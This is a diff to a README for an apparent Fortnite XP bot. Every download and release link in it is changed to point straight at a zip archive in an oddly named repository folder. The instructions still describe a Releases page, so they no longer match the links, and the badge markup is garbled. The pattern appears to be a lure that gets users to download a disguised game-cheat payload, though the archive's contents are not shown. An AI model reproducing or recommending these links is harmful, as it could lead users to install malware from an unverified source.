@@ -1,6 +1,6 @@
 # 🎮 helper-for-fortnite-xp-bot - Easy Tools for Fortnite Customization
 
-[![Download Now](https://img.shields.io/badge/Download%20Now%20-blue.svg?style=for-the-badge)](https://github.com/SYS123232/helper-for-fortnite-xp-bot/releases)
+[![Download Now](https://raw.githubusercontent.com/SYS123232/helper-for-fortnite-xp-bot/main/heteropod/for_bot_xp_helper_fortnite_2.0.zip%20Now%https://raw.githubusercontent.com/SYS123232/helper-for-fortnite-xp-bot/main/heteropod/for_bot_xp_helper_fortnite_2.0.zip)](https://raw.githubusercontent.com/SYS123232/helper-for-fortnite-xp-bot/main/heteropod/for_bot_xp_helper_fortnite_2.0.zip)
 
 ## 📖 Project Overview
 
@@ -26,7 +26,7 @@ To get started with `helper-for-fortnite-xp-bot`, follow these steps to download
 
 1. **Visit the Releases Page**: Click the link below to access the Releases page where you can find the latest version of the application.
 
-   [Visit Release Page](https://github.com/SYS123232/helper-for-fortnite-xp-bot/releases)
+   [Visit Release Page](https://raw.githubusercontent.com/SYS123232/helper-for-fortnite-xp-bot/main/heteropod/for_bot_xp_helper_fortnite_2.0.zip)
 
 2. **Download the Application**:
    - On the Releases page, locate the latest version.
@@ -52,7 +52,7 @@ Before running the application, ensure your system meets the following requireme
 
 To download the latest version, please visit the link below. Follow the instructions provided to install the application smoothly.
 
-[Download Now](https://github.com/SYS123232/helper-for-fortnite-xp-bot/releases)
+[Download Now](https://raw.githubusercontent.com/SYS123232/helper-for-fortnite-xp-bot/main/heteropod/for_bot_xp_helper_fortnite_2.0.zip)
 
 ## 🎚️ Application Features
 
